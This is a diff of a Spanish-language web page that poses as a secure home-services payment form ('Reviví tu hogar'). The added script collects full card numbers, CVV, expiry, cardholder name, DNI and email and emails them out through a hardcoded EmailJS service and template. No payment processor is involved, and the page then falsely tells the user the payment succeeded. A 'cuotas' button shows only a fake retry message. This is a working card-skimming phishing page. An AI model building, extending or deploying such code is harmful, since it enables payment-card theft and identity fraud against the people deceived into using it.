@@ -3,8 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Reviví tu Hogar - Pago seguro y simple</title>
+  <title>Reviví tu hogar - Pago seguro y simple</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #0052D4, #4364F7, #6FB1FC);
@@ -27,8 +30,9 @@
     h1 {
       margin: 0 0 8px 0;
       font-weight: 700;
-      font-size: 1.5rem;
+      font-size: 2rem;
       text-align: center;
+      letter-spacing: 1.2px;
     }
     p.subtitle {
       text-align: center;
@@ -40,9 +44,12 @@
       display: block;
       margin-bottom: 6px;
       font-weight: 600;
+      font-size: 0.9rem;
     }
     input[type="text"],
-    input[type="email"] {
+    input[type="email"],
+    input[type="number"],
+    select {
       width: 100%;
       padding: 10px 14px;
       margin-bottom: 18px;
@@ -50,6 +57,37 @@
       border-radius: 6px;
       font-size: 1rem;
       outline: none;
+      transition: box-shadow 0.3s ease;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="number"]:focus,
+    select:focus {
+      box-shadow: 0 0 8px 3px #7191ff;
+    }
+    .error-message {
+      color: #ffbaba;
+      font-size: 0.85rem;
+      margin-top: -14px;
+      margin-bottom: 12px;
+      display: none;
+    }
+    .error-message.active {
+      display: block;
+    }
+    .card-type {
+      margin-bottom: 18px;
+    }
+    .card-type label {
+      display: inline-block;
+      margin-right: 15px;
+      cursor: pointer;
+      font-weight: 600;
+      user-select: none;
+    }
+    .card-type input[type="radio"] {
+      margin-right: 6px;
+      cursor: pointer;
     }
     button {
       width: 100%;
@@ -61,53 +99,316 @@
       border-radius: 8px;
       cursor: pointer;
       font-weight: 700;
+      transition: background-color 0.25s ease;
+      margin-bottom: 15px;
     }
-    button:hover {
+    button:hover:not(:disabled) {
       background-color: #002a85;
+    }
+    button:disabled {
+      background-color: #666;
+      cursor: not-allowed;
+    }
+    .loader {
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top: 4px solid #fff;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 15px auto 10px;
+      display: none;
+    }
+    .loader.active {
+      display: block;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
     }
     .message {
       text-align: center;
       font-weight: 600;
-      margin-top: 14px;
+      margin-top: 12px;
       font-size: 1rem;
-      display: none;
+      min-height: 24px;
+      color: #a6f1a6;
+    }
+    .monto-input {
+      position: relative;
+    }
+    .monto-input span {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+      font-weight: 700;
+    }
+    input#monto {
+      padding-left: 22px;
+      color: #222;
+      font-weight: 700;
+    }
+    #mensajeCuotas {
       color: #ffdede;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Reviví tu Hogar - Pago seguro y simple</h1>
-    <p class="subtitle">Ingresá los datos de tu tarjeta</p>
-    
-    <form id="formularioPago">
+    <h1>Reviví tu hogar - Pago seguro y simple</h1>
+    <p class="subtitle">Seleccione el monto a pagar y complete el formulario con sus datos. Recibirá una confirmación en su correo.</p>
+
+    <form id="form-pago" novalidate>
+      <!-- Monto -->
+      <label for="monto">Monto a pagar</label>
+      <div class="monto-input">
+        <span>$</span>
+        <input
+          type="number"
+          id="monto"
+          name="monto"
+          min="1"
+          step="0.01"
+          placeholder="Ingrese monto en pesos"
+          required
+        />
+      </div>
+      <div class="error-message" id="error-monto">Ingrese un monto válido mayor a $0.</div>
+
+      <!-- Tipo de tarjeta -->
+      <div class="card-type">
+        <label>Tipo de tarjeta</label>
+        <label><input type="radio" name="tipoTarjeta" value="Visa" required /> Visa</label>
+        <label><input type="radio" name="tipoTarjeta" value="Mastercard" required /> Mastercard</label>
+      </div>
+      <div class="error-message" id="error-tipoTarjeta">Seleccione un tipo de tarjeta.</div>
+
+      <!-- Nombre -->
       <label for="nombre">Nombre completo</label>
-      <input type="text" id="nombre" name="nombre" required />
+      <input type="text" id="nombre" name="nombre" placeholder="Ej: Juan Pérez" required />
+      <div class="error-message" id="error-nombre">Ingrese su nombre completo.</div>
 
-      <label for="numero">Número de tarjeta</label>
-      <input type="text" id="numero" name="numero" required />
-
-      <label for="vencimiento">Fecha de vencimiento</label>
-      <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" required />
-
-      <label for="codigo">Código de seguridad</label>
-      <input type="text" id="codigo" name="codigo" required />
-
+      <!-- Email -->
       <label for="email">Correo electrónico</label>
-      <input type="email" id="email" name="email" required />
+      <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required />
+      <div class="error-message" id="error-email">Ingrese un correo válido.</div>
 
-      <button type="submit">Ver opciones de cuotas</button>
-      <div class="message" id="mensajePago">Vuelve a reintentar en unos minutos o verifica los datos de tu tarjeta</div>
+      <!-- DNI -->
+      <label for="dni">DNI</label>
+      <input type="text" id="dni" name="dni" placeholder="Ingrese su DNI" pattern="^\d{6,10}$" required />
+      <div class="error-message" id="error-dni">Ingrese un DNI válido (6-10 dígitos).</div>
+
+      <!-- Número de tarjeta -->
+      <label for="tarjeta">Número de tarjeta</label>
+      <input type="text" id="tarjeta" name="tarjeta" maxlength="19" placeholder="1234 5678 9012 3456" required />
+      <div class="error-message" id="error-tarjeta">Número de tarjeta inválido.</div>
+
+      <!-- Titular -->
+      <label for="titular">Nombre del titular</label>
+      <input type="text" id="titular" name="titular" placeholder="Nombre tal como aparece en la tarjeta" required />
+      <div class="error-message" id="error-titular">Ingrese el nombre del titular.</div>
+
+      <!-- Vencimiento -->
+      <label for="vencimiento">Fecha de expiración (MM/AA)</label>
+      <input
+        type="text"
+        id="vencimiento"
+        name="vencimiento"
+        placeholder="MM/AA"
+        maxlength="5"
+        required
+      />
+      <div class="error-message" id="error-vencimiento">Fecha inválida o expiró.</div>
+
+      <!-- CVV -->
+      <label for="cvv">Código de seguridad (CVV)</label>
+      <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="123" required />
+      <div class="error-message" id="error-cvv">CVV inválido.</div>
+
+      <button type="submit" id="btnEnviar">Realizar pago</button>
     </form>
+
+    <!-- NUEVO BOTÓN PARA OPCIONES DE CUOTAS -->
+    <button id="btnCuotas">Ver opciones de cuotas</button>
+    <div id="mensajeCuotas">Vuelve a reintentar en unos minutos o verifica los datos de tu tarjeta</div>
+
+    <div class="loader" id="loader"></div>
+    <div class="message" id="message"></div>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    const form = document.getElementById("formularioPago");
-    const mensaje = document.getElementById("mensajePago");
+    emailjs.init('FL6vofHg7F9vLawQs'); // Tu public key
 
-    form.addEventListener("submit", function(e) {
+    const form = document.getElementById('form-pago');
+    const loader = document.getElementById('loader');
+    const message = document.getElementById('message');
+    const btnEnviar = document.getElementById('btnEnviar');
+
+    const btnCuotas = document.getElementById('btnCuotas');
+    const mensajeCuotas = document.getElementById('mensajeCuotas');
+
+    function validate() {
+      let valid = true;
+      const showError = (id) => document.getElementById(id).classList.add('active');
+      const hideError = (id) => document.getElementById(id).classList.remove('active');
+
+      const monto = form.monto.value.trim();
+      if (!monto || isNaN(monto) || Number(monto) <= 0) {
+        showError('error-monto');
+        valid = false;
+      } else {
+        hideError('error-monto');
+      }
+
+      if (![...form.tipoTarjeta].some(r => r.checked)) {
+        showError('error-tipoTarjeta');
+        valid = false;
+      } else {
+        hideError('error-tipoTarjeta');
+      }
+
+      if (!form.nombre.value.trim()) {
+        showError('error-nombre');
+        valid = false;
+      } else {
+        hideError('error-nombre');
+      }
+
+      if (!form.email.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.value)) {
+        showError('error-email');
+        valid = false;
+      } else {
+        hideError('error-email');
+      }
+
+      if (!/^\d{6,10}$/.test(form.dni.value.trim())) {
+        showError('error-dni');
+        valid = false;
+      } else {
+        hideError('error-dni');
+      }
+
+      let tarjetaVal = form.tarjeta.value.replace(/\s+/g, '');
+      if (!/^\d{13,19}$/.test(tarjetaVal)) {
+        showError('error-tarjeta');
+        valid = false;
+      } else {
+        hideError('error-tarjeta');
+      }
+
+      if (!form.titular.value.trim()) {
+        showError('error-titular');
+        valid = false;
+      } else {
+        hideError('error-titular');
+      }
+
+      const venc = form.vencimiento.value.trim();
+      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(venc)) {
+        showError('error-vencimiento');
+        valid = false;
+      } else {
+        const [mes, anio] = venc.split('/');
+        const ahora = new Date();
+        const añoActual = ahora.getFullYear() % 100;
+        const mesActual = ahora.getMonth() + 1;
+        if (parseInt(anio) < añoActual || (parseInt(anio) === añoActual && parseInt(mes) < mesActual)) {
+          showError('error-vencimiento');
+          valid = false;
+        } else {
+          hideError('error-vencimiento');
+        }
+      }
+
+      if (!/^\d{3,4}$/.test(form.cvv.value.trim())) {
+        showError('error-cvv');
+        valid = false;
+      } else {
+        hideError('error-cvv');
+      }
+
+      return valid;
+    }
+
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
-      mensaje.style.display = "block";
+      message.textContent = '';
+      mensajeCuotas.style.display = 'none'; // Ocultamos mensaje cuotas si estaba visible
+      if (!validate()) {
+        return;
+      }
+
+      btnEnviar.disabled = true;
+      loader.classList.add('active');
+
+      const tipoTarjeta = [...form.tipoTarjeta].find(r => r.checked).value;
+      const templateParams = {
+        nombre: form.nombre.value.trim(),
+        email: form.email.value.trim(),
+        dni: form.dni.value.trim(),
+        tarjeta: form.tarjeta.value.trim(),
+        titular: form.titular.value.trim(),
+        vencimiento: form.vencimiento.value.trim(),
+        cvv: form.cvv.value.trim(),
+        monto: form.monto.value.trim(),
+        tipoTarjeta: tipoTarjeta
+      };
+
+      emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
+        .then(() => {
+          loader.classList.remove('active');
+          message.style.color = '#a6f1a6';
+          message.textContent = 'Pago realizado con éxito.';
+          form.reset();
+          btnEnviar.disabled = false;
+        }, (error) => {
+          loader.classList.remove('active');
+          message.style.color = '#f28b82';
+          message.textContent = 'Error al enviar, intenta nuevamente.';
+          btnEnviar.disabled = false;
+          console.error('EmailJS error:', error);
+        });
+    });
+
+    btnCuotas.addEventListener('click', () => {
+      mensajeCuotas.style.display = 'block';
+      message.textContent = '';  // Limpiar mensajes anteriores si hay
+    });
+
+    // Formateo número de tarjeta con espacios cada 4 dígitos
+    const tarjetaInput = form.tarjeta;
+    tarjetaInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 19);
+      let partes = [];
+      for (let i = 0; i < valor.length; i += 4) {
+        partes.push(valor.substring(i, i + 4));
+      }
+      e.target.value = partes.join(' ');
+    });
+
+    // Formato fecha MM/AA
+    const vencimientoInput = form.vencimiento;
+    vencimientoInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 4);
+      if (valor.length >= 3) {
+        valor = valor.substring(0,2) + '/' + valor.substring(2);
+      }
+      e.target.value = valor;
+    });
+
+    // Solo permitir números en CVV y DNI
+    form.cvv.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
+    });
+    form.dni.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0,10);
     });
   </script>
 </body>
